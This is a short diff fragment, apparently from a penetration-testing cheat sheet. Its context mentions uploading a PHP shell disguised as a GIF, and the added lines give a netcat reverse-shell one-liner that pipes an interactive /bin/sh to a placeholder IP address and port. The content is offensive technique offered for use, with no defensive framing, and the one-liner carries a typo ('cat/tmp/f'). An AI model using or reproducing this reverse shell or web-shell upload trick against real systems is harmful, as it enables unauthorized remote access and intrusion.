@@ -111,3 +111,8 @@ Upload php shell as gif
           <?PHP
           // this is the contents of the script
      
+----------------- Reverse Shell One Liner -----------------
+rm /tmp/f;mkfifo /tmp/f;cat/tmp/f|/bin/sh -i 2>&1|nc <IP Address> 1234 > /tmp/f
+
+
+
